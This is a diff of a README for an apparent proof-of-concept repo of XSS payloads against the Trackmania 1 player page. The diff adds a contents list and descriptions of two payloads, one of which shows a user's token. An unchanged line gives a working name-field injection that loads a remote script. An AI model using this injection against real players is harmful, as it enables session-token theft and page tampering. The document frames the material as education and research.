@@ -2,6 +2,14 @@
 Repo of XSS payloads you can try when using Trackmania 1's playerpage
 > [!WARNING]
 > I am not responsible for any damage done with the knowledge from this repo. It's a proof of concept which is created only for education and research purposes. By using this code you accept that you will **NOT** use this method in malicious purposes and that [kvbaxi](https://github.com/kvbaxi) takes no responsibility for misusage of this content.
+  
+- **[🔗 trackmania-xss-payloads](#-trackmania-xss-payloads)**
+  - [💻 Put this in your name to make payload](#-put-this-in-your-name-to-make-payload)
+  - [❗ How can you be safe?](#-how-can-you-be-safe)
+  - [❓ How does it work?](#-how-does-it-work)
+  - [🎥 Preview](#-preview)
+  - [❔ List of payloads](#-list-of-payloads)
+  
 ## 💻 Put this in your name to make payload
 ```
 $l["><script/src="//payload_link_here"></script>]username
@@ -25,4 +33,9 @@ Due to need in saving characters you cannot use the GitHub Pages link I have for
 
 ## 🎥 Preview
 https://github.com/kvbaxi/trackmania-xss-payloads/assets/47297843/2a2593d9-e276-443b-9a18-7e3edaeb854f
+
+## ❔ List of payloads
+There are 2 example payloads prepared in the repo:
+- [main.js](https://github.com/kvbaxi/trackmania-xss-payloads/blob/main/main.js) - Script informs user about their token (censored version) and then changes styles of the page. (as shown in preview above.)
+- [rickroll.js](https://github.com/kvbaxi/trackmania-xss-payloads/blob/main/rickroll.js) - Scripts asks user for interaction with the website and then shows new popup with rick roll.
 
